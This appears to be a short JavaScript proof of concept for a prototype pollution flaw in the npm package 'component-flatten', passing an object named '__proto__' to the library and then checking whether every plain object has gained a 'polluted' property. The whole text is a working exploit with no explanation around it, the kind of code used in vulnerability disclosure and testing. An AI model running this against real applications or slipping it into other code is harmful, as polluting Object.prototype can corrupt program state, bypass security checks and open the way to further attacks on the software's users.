var a = require("component-flatten");
var tree = { ref: "polluted", name: "__proto__" };
a(tree);
console.log({}.polluted);
